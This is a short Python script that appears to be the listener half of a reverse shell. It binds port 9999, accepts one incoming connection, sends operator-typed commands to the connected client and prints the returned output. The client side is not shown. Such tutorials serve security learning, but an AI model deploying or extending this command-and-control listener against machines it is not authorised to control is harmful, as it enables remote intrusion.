import socket
import sys

#create a socket i.e connect to computers
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("socket creation error"+str(msg))

# binding port and socket together
def bind_socket():
    try:
        global host
        global port
        global s

        print("binding the port "+str(port))
        s.bind((host,port))
        s.listen(4)
    except socket.error as msg:
        print("error in binding "+ str(msg) + "\n"+ "retrying...")
        bind_socket()

#establish connection with a client & socket is listening

def socket_accept():
    conn,address= s.accept()
    print("connection has been established" + "IP"+ address[0]+ "| Port"+ str(address[1]))
    send_commands(conn)
    conn.close()
#send commands to client
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response,end ='')

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()

